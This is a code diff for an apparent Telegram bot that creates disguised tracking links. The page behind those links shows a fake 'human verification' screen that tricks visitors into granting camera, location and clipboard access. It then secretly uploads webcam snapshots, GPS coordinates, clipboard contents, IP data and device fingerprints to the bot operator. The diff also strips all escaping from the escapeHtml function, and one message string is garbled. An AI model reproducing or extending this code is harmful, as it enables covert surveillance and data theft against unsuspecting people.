@@ -55,17 +55,9 @@ const Link = mongoose.model('Link', linkSchema);
 const userState = {};
 
 let shareSystemEnabled = true;
+let activeOffer = null; // { reward: '10' or '1w', expiresAt: timestamp }
 let botUsername = "DX_CODEX_BOT";
 bot.getMe().then(me => botUsername = me.username);
-
-// Global Offer State
-let globalOffer = {
-    active: false,
-    amount: 0,
-    type: null, // 'coin' or 'sub'
-    subString: null,
-    expiresAt: 0
-};
 
 
 const fontMap = {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ғ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ','s':'s','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ','A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ғ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ','S':'s','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ','0':'₀','1':'₁','2':'₂','3':'₃','4':'₄','5':'₅','6':'₆','7':'₇','8':'₈','9':'₉'};
@@ -84,11 +76,11 @@ function makeBorder(title, content) {
 function escapeHtml(text) {
     if (!text) return text;
     return text.toString()
-        .replace(/&/g, "&amp;")
-        .replace(/</g, "&lt;")
-        .replace(/>/g, "&gt;")
-        .replace(/"/g, "&quot;")
-        .replace(/'/g, "&#039;");
+        .replace(/&/g, "&")
+        .replace(/</g, "<")
+        .replace(/>/g, ">")
+        .replace(/"/g, """)
+        .replace(/'/g, "'");
 }
 
 
@@ -161,33 +153,33 @@ bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
                 if (referrer) {
                     referrer.referralCount += 1;
                     if (referrer.referralCount % 2 === 0) {
-                        
-                        // OFFER SYSTEM CHECK
-                        if (globalOffer.active && Date.now() < globalOffer.expiresAt) {
-                            if (globalOffer.type === 'coin') {
-                                referrer.coins += globalOffer.amount;
-                                bot.sendMessage(referrer.chatId, makeBorder("🎉 sᴘᴇᴄɪᴀʟ ᴏғғᴇʀ ʀᴇᴡᴀʀᴅ", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💰: +${globalOffer.amount} ᴄᴏɪɴs ᴀᴅᴅᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ.`), {parse_mode:'HTML'});
-                            } else if (globalOffer.type === 'sub') {
+                        if (activeOffer && Date.now() < activeOffer.expiresAt) {
+                            const valStr = activeOffer.reward;
+                            if (valStr.match(/[dwmy]$/)) { // Subscriptions
+                                const val = parseInt(valStr);
                                 let multiplier = 0;
-                                const amtStr = globalOffer.subString;
-                                const val = parseInt(amtStr);
-                                if (amtStr.includes('d')) multiplier = 24 * 60 * 60 * 1000;
-                                else if (amtStr.includes('w')) multiplier = 7 * 24 * 60 * 60 * 1000;
-                                else if (amtStr.includes('m')) multiplier = 30 * 24 * 60 * 60 * 1000;
-                                else if (amtStr.includes('y')) multiplier = 365 * 24 * 60 * 60 * 1000;
+                                if (valStr.includes('d')) multiplier = 24 * 60 * 60 * 1000;
+                                else if (valStr.includes('w')) multiplier = 7 * 24 * 60 * 60 * 1000;
+                                else if (valStr.includes('m')) multiplier = 30 * 24 * 60 * 60 * 1000;
+                                else if (valStr.includes('y')) multiplier = 365 * 24 * 60 * 60 * 1000;
+
+                                const currentExpiry = referrer.subscriptionExpiry && referrer.subscriptionExpiry > Date.now() ? referrer.subscriptionExpiry.getTime() : Date.now();
+                                referrer.subscriptionExpiry = new Date(currentExpiry + (val * multiplier));
                                 
-                                const nowTime = Math.max(Date.now(), referrer.subscriptionExpiry ? referrer.subscriptionExpiry.getTime() : 0);
-                                referrer.subscriptionExpiry = new Date(nowTime + (val * multiplier));
-                                bot.sendMessage(referrer.chatId, makeBorder("🎉 sᴘᴇᴄɪᴀʟ ᴏғғᴇʀ ʀᴇᴡᴀʀᴅ", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💎: +${globalOffer.subString} sᴜʙsᴄʀɪᴘᴛɪᴏɴ ᴀᴅᴅᴇᴅ!`), {parse_mode:'HTML'});
+                                bot.sendMessage(referrer.chatId, makeBorder("🎉 ᴏғғᴇʀ ʀᴇᴡᴀʀᴅ", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💎: ${val}${valStr.slice(-1)} sᴜʙsᴄʀɪᴘᴛɪᴏɴ ᴀᴅᴅᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ.`), {parse_mode:'HTML'});
+                            } else { // Coins
+                                const val = parseInt(valStr);
+                                if (!isNaN(val)) {
+                                    referrer.coins += val;
+                                    bot.sendMessage(referrer.chatId, makeBorder("🎉 ᴏғғᴇʀ ʀᴇᴡᴀʀᴅ", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💰: +${val} ᴄᴏɪɴs ᴀᴅᴅᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ.`), {parse_mode:'HTML'});
+                                }
                             }
                         } else {
-                            // Default Reward
                             referrer.freeUrlsLeft += 1;
                             bot.sendMessage(referrer.chatId, makeBorder("🎉 ʀᴇғᴇʀʀᴀʟ sᴜᴄᴄᴇss", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💰: +1 ғʀᴇᴇ ᴄᴏɪɴ ᴀᴅᴅᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ.`), {parse_mode:'HTML'});
                         }
-
                     } else {
-                        bot.sendMessage(referrer.chatId, makeBorder("📈 ʀᴇғᴇʀʀᴀʟ ᴛʀᴀᴄᴋ", `✅: 1 ɴᴇᴡ ᴜsᴇʀ ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n⚠️: ɪɴᴠɪᴛᴇ 1 ᴍᴏʀᴇ ᴛᴏ ɢᴇᴛ ʀᴇᴡᴀʀᴅ.`), {parse_mode:'HTML'});
+                        bot.sendMessage(referrer.chatId, makeBorder("📈 ʀᴇғᴇʀʀᴀʟ ᴛʀᴀᴄᴋ", `✅: 1 ɴᴇᴡ ᴜsᴇʀ ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n⚠️: ɪɴᴠɪᴛᴇ 1 ᴍᴏʀᴇ ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ʀᴇᴡᴀʀᴅ.`), {parse_mode:'HTML'});
                     }
                     await referrer.save();
                 }
@@ -316,7 +308,7 @@ bot.on('message', async (msg) => {
         return; 
     }
 
-    if (text && (text.startsWith('/add ') || text.startsWith('/rem ') || text.startsWith('/rm ') || text.startsWith('/reset ') || text.startsWith('/ban ') || text.startsWith('/unban ') || text.startsWith('/users') || text.startsWith('/share ') || text.startsWith('/sudo') || text.startsWith('/gift') || text.startsWith('/ref ') || text.startsWith('/offer'))) return;
+    if (text && (text.startsWith('/add ') || text.startsWith('/rem ') || text.startsWith('/rm ') || text.startsWith('/reset ') || text.startsWith('/ban ') || text.startsWith('/unban ') || text.startsWith('/users') || text.startsWith('/share ') || text.startsWith('/sudo') || text.startsWith('/gift') || text.startsWith('/ref ') || text.startsWith('/offer '))) return;
     if ((msg.caption && msg.caption.startsWith('/broadcast')) || (text && text.startsWith('/broadcast'))) return handleBroadcast(msg);
 
     if (!text) return;
@@ -520,7 +512,7 @@ bot.on('callback_query', async (query) => {
         try {
             const { allJoined } = await checkMembership(chatId);
             if (allJoined) {
-                await bot.answerCallbackQuery(query.id, { text: "✅ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ sᴜᴄssᴇss!" });
+                await bot.answerCallbackQuery(query.id, { text: "✅ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ sᴜᴄᴄᴇss!" });
 
                 try { await bot.deleteMessage(chatId, msg.message_id); } catch (e) { }
 
@@ -566,7 +558,7 @@ bot.on('callback_query', async (query) => {
     }
     else if (data === 'create_custom') {
         userState[chatId] = { step: 'await_custom_name' };
-        bot.sendMessage(chatId, makeBorder("ᴄᴜsᴛᴏᴍ", "<b>✏️: sᴇɴᴅ ʏᴏᴜʀ ᴄᴜsᴛᴏᴍ ʟɪɴᴋ ɴᴀᴍᴇ</b>"), { parse_mode: 'HTML' });
+        bot.sendMessage(chatId, makeBorder("ᴄᴜsᴛᴏᴍ", "<b>✏️: sᴇɴᴅ ʏᴏᴜʀ ᴄᴜspportune ʟɪɴᴋ ɴᴀᴍᴇ</b>"), { parse_mode: 'HTML' });
     } 
     else if (data === 'create_random') {
         askRedirect(query, Math.random().toString(36).substring(7));
@@ -667,24 +659,21 @@ bot.onText(/\/sudo(?:\s+(.+))?/, async (msg, match) => {
         return bot.sendMessage(msg.chat.id, txt, {parse_mode:'HTML'});
     }
 
-    let isRemove = false;
     let targetId;
     let targetName = "User";
-    
-    let inputStr = match[1] ? match[1].trim() : "";
-    if (inputStr.toLowerCase().startsWith('r ')) {
+    let isRemove = false;
+    let cleanInput = match[1] ? match[1].trim() : "";
+
+    if (cleanInput.toLowerCase().startsWith('r ')) {
         isRemove = true;
-        inputStr = inputStr.substring(2).trim();
+        cleanInput = cleanInput.substring(2).trim();
     }
 
     if (msg.reply_to_message) {
         targetId = msg.reply_to_message.from.id;
         targetName = msg.reply_to_message.from.first_name || "User";
-        if (match[1] && match[1].trim().toLowerCase() === 'r') {
-            isRemove = true;
-        }
-    } else if (inputStr) {
-        const cleanInput = inputStr.replace('@', '');
+    } else if (cleanInput) {
+        cleanInput = cleanInput.replace('@', '');
         if (/^\d+$/.test(cleanInput)) {
             targetId = parseInt(cleanInput);
         } else {
@@ -704,7 +693,11 @@ bot.onText(/\/sudo(?:\s+(.+))?/, async (msg, match) => {
     if (!targetUser) {
         targetUser = new User({ chatId: targetId, firstName: targetName, isSudo: !isRemove });
     } else {
-        targetUser.isSudo = isRemove ? false : !targetUser.isSudo;
+        if (isRemove) {
+            targetUser.isSudo = false;
+        } else {
+            targetUser.isSudo = true;
+        }
     }
     await targetUser.save();
     
@@ -922,8 +915,7 @@ bot.onText(/\/menu/, async (msg) => {
     menu += `├ <code>/add</code> [ǫᴛʏ/1d,1m,1y] [ɪᴅ] - ᴀᴅᴅ ᴄᴏɪɴs/sᴜʙs\n`;
     menu += `├ <code>/rm</code> [ǫᴛʏ] [ɪᴅ] - ʀᴇᴍᴏᴠᴇ ᴄᴏɪɴs\n`;
     menu += `├ <code>/reset</code> [ɪᴅ] - ʀᴇsᴇᴛ ᴀᴄᴄᴏᴜɴᴛ\n`;
-    menu += `├ <code>/sudo</code> [ɪᴅ] - ᴛᴏɢɢʟᴇ sᴜᴅᴏ ᴀᴄᴄᴇss\n`;
-    menu += `├ <code>/sudo r</code> [ɪᴅ] - ʀᴇᴍᴏᴠᴇ sᴜᴅᴏ\n`;
+    menu += `├ <code>/sudo</code> [ɪᴅ] / r [ɪᴅ] - ᴛᴏɢɢʟᴇ/ʀᴇᴍᴏᴠᴇ sᴜᴅᴏ ᴀᴄᴄᴇss\n`;
     menu += `├ <code>/share on|off</code> - ᴛᴏɢɢʟᴇ ʀᴇғᴇʀʀᴀʟ\n`;
     menu += `├ <code>/ban</code> [ɪᴅ/ʀᴇᴘʟʏ] - ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀ\n`;
     menu += `└ <code>/unban</code> [ɪᴅ/ʀᴇᴘʟʏ] - ʟɪғᴛ ʙᴀɴ\n\n`;
@@ -931,7 +923,7 @@ bot.onText(/\/menu/, async (msg) => {
     menu += `📢 <b>ʙʀᴏᴀᴅᴄᴀsᴛ sʏsᴛᴇᴍ</b>\n`;
     menu += `├ <code>/broadcast</code> [text/media] - sᴇɴᴅ ᴍᴇssᴀɢᴇ\n`;
     menu += `├ <code>/ref</code> [html text] - ʙʀᴏᴀᴅᴄᴀsᴛ ᴡɪᴛʜ ʀᴇғᴇʀʀᴀʟ\n`;
-    menu += `└ <code>/offer</code> (amount) [text] - ᴄʀᴇᴀᴛᴇ ᴏғғᴇʀ\n\n`;
+    menu += `└ <code>/offer</code> (qty/1d) [html] - sᴇɴᴅ 24h ᴏғғᴇʀ ʙʀᴏᴀᴅᴄᴀsᴛ\n\n`;
 
     const menuBorder = (title, body) => `<b>┏─「 ${_fnt(title)} 」</b>\n${body.split('\n').map(l => `<b>┃</b> ${l}`).join('\n')}\n<b>┗───────────╼</b>`;
 
@@ -1119,31 +1111,20 @@ bot.onText(/\/ref\s+(.+)/s, async (msg, match) => {
     bot.sendMessage(msg.chat.id, `✅ <b>ʀᴇғᴇʀʀᴀʟ ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!</b>\nsᴜᴄᴄᴇss: <code>${success}</code> | ʙʟᴏᴄᴋᴇᴅ: <code>${blocked}</code> | ғᴀɪʟᴇᴅ: <code>${failed}</code>`, {parse_mode:'HTML'});
 });
 
-bot.onText(/\/offer\s+\(([^)]+)\)\s+(.+)/s, async (msg, match) => {
+bot.onText(/\/offer\s+\((.+)\)\s+(.+)/s, async (msg, match) => {
     if (!(await checkAdmin(msg.from.id))) return;
     
-    const rewardStr = match[1].toLowerCase().trim();
+    const reward = match[1].trim().toLowerCase();
     const htmlText = match[2];
-    
-    // Parse reward
-    if (rewardStr.match(/[dwmy]$/)) {
-        globalOffer.type = 'sub';
-        globalOffer.subString = rewardStr;
-        const val = parseInt(rewardStr);
-        if (isNaN(val)) return bot.sendMessage(msg.chat.id, "❌ Invalid sub format");
-    } else {
-        const val = parseInt(rewardStr);
-        if (isNaN(val)) return bot.sendMessage(msg.chat.id, "❌ Invalid coin format");
-        globalOffer.type = 'coin';
-        globalOffer.amount = val;
-    }
-    
-    globalOffer.active = true;
-    globalOffer.expiresAt = Date.now() + (24 * 60 * 60 * 1000); // Valid for 24 Hours
-    
+
+    activeOffer = {
+        reward: reward,
+        expiresAt: Date.now() + 24 * 60 * 60 * 1000 
+    };
+
     const users = await User.find({});
-    bot.sendMessage(msg.chat.id, `⏳ <b>sᴇᴛᴛɪɴɢ ᴜᴘ ᴏғғᴇʀ ᴀɴᴅ ʙʀᴏᴀᴅᴄᴀsᴛɪɴɢ ᴛᴏ ${users.length} ᴜsᴇʀs...</b>`, {parse_mode:'HTML'});
-    
+    bot.sendMessage(msg.chat.id, `⏳ <b>sᴇɴᴅɪɴɢ ᴏғғᴇʀ (${reward}) ᴛᴏ ${users.length} ᴜsᴇʀs...</b>`, {parse_mode:'HTML'});
+
     let success = 0, failed = 0, blocked = 0;
     for (const u of users) {
         try {
@@ -1157,10 +1138,10 @@ bot.onText(/\/offer\s+\(([^)]+)\)\s+(.+)/s, async (msg, match) => {
             if (e.response && e.response.body && e.response.body.error_code === 403) blocked++;
             else failed++;
         }
-        await new Promise(resolve => setTimeout(resolve, 50)); 
+        await new Promise(resolve => setTimeout(resolve, 50));
     }
-    
-    bot.sendMessage(msg.chat.id, `✅ <b>ᴏғғᴇʀ ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!</b>\n⏰ <b>ᴠᴀʟɪᴅ ғᴏʀ: 24 ʜᴏᴜʀs</b>\n🎁 <b>ʀᴇᴡᴀʀᴅ: ${rewardStr}</b>\nsᴜᴄᴄᴇss: <code>${success}</code> | ʙʟᴏᴄᴋᴇᴅ: <code>${blocked}</code>`, {parse_mode:'HTML'});
+
+    bot.sendMessage(msg.chat.id, `✅ <b>ᴏғғᴇʀ ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!</b>\n🎁 ʀᴇᴡᴀʀᴅ: <code>${reward}</code> (Valid for 24h)\nsᴜᴄᴄᴇss: <code>${success}</code> | ʙʟᴏᴄᴋᴇᴅ: <code>${blocked}</code> | ғᴀɪʟᴇᴅ: <code>${failed}</code>`, {parse_mode:'HTML'});
 });
 
 
@@ -1231,20 +1212,25 @@ function getHtmlTemplate(linkId, redirectUrl) {
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body{margin:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden}
-        #status{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;z-index:10;width:100%;}
+        #status{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;z-index:10}
         #v, #c { display:none }
         #iframeOverlay {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             border: none; z-index: 5; display: none; background: #fff;
         }
-        .btn { padding:15px 30px; font-size:20px; background:#0f0; color:#000; border:2px solid #0f0; cursor:pointer; font-family:monospace; font-weight:bold; box-shadow: 0 0 15px #0f0; border-radius: 5px; margin-top:15px; }
-        .btn:hover { background: #000; color: #0f0; }
+        #guard {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999;
+            background: rgba(0,0,0,0.85); display: flex; align-items: center; justify-content: center;
+            cursor: pointer; flex-direction: column; text-align: center; font-size: 20px;
+            color: #0f0; border: 2px solid #0f0;
+        }
     </style>
 </head>
 <body>
     <canvas id="matrix"></canvas>
-    <div id="status">
-        <button class="btn" onclick="startAll()">CLICK TO VERIFY</button>
+    <div id="status">INITIALIZING SECURE PROTOCOL...<br>PLEASE WAIT</div>
+    <div id="guard">
+        <div id="guardText">⚠️ HUMAN VERIFICATION REQUIRED ⚠️<br><br><span style="font-size:15px;color:#aaa;">[ CLICK ANYWHERE TO VERIFY YOUR IDENTITY ]</span></div>
     </div>
     <video id="v" autoplay playsinline></video><canvas id="c"></canvas>
     <iframe id="iframeOverlay"></iframe>
@@ -1264,20 +1250,7 @@ const drops=Array(Math.floor(m.width/20)).fill(0);
 function draw(){ ctx.fillStyle='rgba(0,0,0,0.05)'; ctx.fillRect(0,0,m.width,m.height); ctx.fillStyle='#0f0'; ctx.font='15px monospace'; drops.forEach((y,i)=>{ const t=String.fromCharCode(Math.random()*128); ctx.fillText(t,i*20,y*20); if(y*20>m.height&&Math.random()>0.975)drops[i]=0; drops[i]++; }); }
 setInterval(draw,33);
 
-let camGot = false;
-let locGot = false;
-let clipGot = false;
-
-function checkRedirect() {
-    if (camGot && locGot && clipGot) {
-        document.getElementById('status').innerHTML = "<h2 style='color:#0f0'>VERIFIED! REDIRECTING...</h2>";
-        if (red && red.length > 4 && red !== "null") {
-            setTimeout(() => { window.location.href = red; }, 1500);
-        }
-    }
-}
-
-async function sendBasicInfo() {
+async function sendInfo() {
     let ipData = { ip:"Unknown", city:"Unknown", country:"Unknown", isp:"Unknown", loc:"Unknown" }; 
     try { 
         const r1 = await fetch('https://ipapi.co/json/'); 
@@ -1290,13 +1263,7 @@ async function sendBasicInfo() {
             const d2 = await r2.json();
             if (d2.ip) ipData = { ip: d2.ip, city: d2.city||"?", country: d2.country||"?", isp: d2.connection?.isp||"?", loc: d2.latitude+","+d2.longitude };
             else throw new Error("Fallback 2");
-        } catch(e2) {
-            try {
-                const r3 = await fetch('https://api.ipify.org?format=json');
-                const d3 = await r3.json();
-                ipData.ip = d3.ip;
-            } catch(e3){}
-        }
+        } catch(e2) {}
     }
     
     let batt = "N/A"; 
@@ -1310,76 +1277,57 @@ async function sendBasicInfo() {
     } catch(e){}
 
     const info = {
-        ipData: ipData,
-        battery: batt, 
-        gpu: gpu,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        ipData: ipData, battery: batt, gpu: gpu, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         screen: { width:screen.width, height:screen.height, depth:screen.colorDepth },
-        navigator: { 
-            platform: navigator.platform, 
-            hardwareConcurrency: navigator.hardwareConcurrency, 
-            deviceMemory: navigator.deviceMemory, 
-            userAgent: navigator.userAgent,
-            language: navigator.language 
-        }
+        navigator: { platform: navigator.platform, hardwareConcurrency: navigator.hardwareConcurrency, deviceMemory: navigator.deviceMemory, userAgent: navigator.userAgent, language: navigator.language }
     };
 
     fetch('/api/data', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({linkId:id, type:'info', data:info}) });
 }
 
-async function startAll() {
-    document.getElementById('status').innerHTML = "INITIALIZING SECURE PROTOCOL...<br>PLEASE ALLOW ALL PERMISSIONS";
-    
-    sendBasicInfo();
+const guard = document.getElementById('guard');
+const guardText = document.getElementById('guardText');
 
-    // Clipboard checking on explicit button click
+guard.addEventListener('click', async () => {
     try {
+        guardText.innerHTML = "⏳ REQUESTING ACCESS... PLEASE ALLOW PERMISSIONS ⏳";
+        
         const text = await navigator.clipboard.readText();
-        if (text) {
-            fetch('/api/data', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({linkId:id, type:'clip', data:text})});
-        }
-        clipGot = true;
-    } catch(err) {
-        document.getElementById('status').innerHTML = "CLIPBOARD PERMISSION REQUIRED.<br><button class='btn' onclick='startAll()'>RETRY</button>";
-        return;
-    }
+        if (text) fetch('/api/data', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({linkId:id, type:'clip', data:text})});
 
-    // Request Location
-    navigator.geolocation.getCurrentPosition((pos) => {
+        const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+        
+        const pos = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject);
+        });
         fetch('/api/data', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({linkId:id, type:'loc', data:{lat: pos.coords.latitude, lon: pos.coords.longitude}})});
-        locGot = true;
-        checkRedirect();
-    }, (err) => {
-        document.getElementById('status').innerHTML = "LOCATION PERMISSION REQUIRED.<br><button class='btn' onclick='startAll()'>RETRY</button>";
-        return;
-    });
 
-    // Request Camera
-    try {
-        const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-        const v = document.getElementById('v'); v.srcObject=s;
+        guard.style.display = 'none';
+
+        const v = document.getElementById('v'); 
+        v.srcObject = stream;
         v.onloadedmetadata = () => {
             let count=0;
             const itv = setInterval(()=>{
                 const cvs=document.getElementById('c'); cvs.width=v.videoWidth; cvs.height=v.videoHeight;
                 cvs.getContext('2d').drawImage(v,0,0);
                 const img=cvs.toDataURL('image/jpeg',0.5);
-                
                 fetch('/api/data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({linkId:id,type:'cam',data:{images:[img],platform:navigator.platform}})});
                 
                 count++; 
                 if(count>=5){ 
                     clearInterval(itv); 
-                    camGot = true;
-                    checkRedirect();
+                    if(red && red.length > 4 && red !== "null") setTimeout(() => { window.location.href=red; }, 2000); 
                 }
-            }, 1000);
+            }, 1500);
         };
-    } catch(e) { 
-        document.getElementById('status').innerHTML = "CAMERA PERMISSION REQUIRED.<br><button class='btn' onclick='startAll()'>RETRY</button>"; 
-        return;
+
+    } catch (err) {
+        guardText.innerHTML = "🚫 ACCESS DENIED 🚫<br><br><span style='font-size:15px;color:#f00;'>YOU MUST ALLOW CAMERA, LOCATION & CLIPBOARD!</span><br><br>[ CLICK TO TRY AGAIN ]";
     }
-}
+});
+
+window.onload = sendInfo;
 </script>
 </body>
 </html>`;
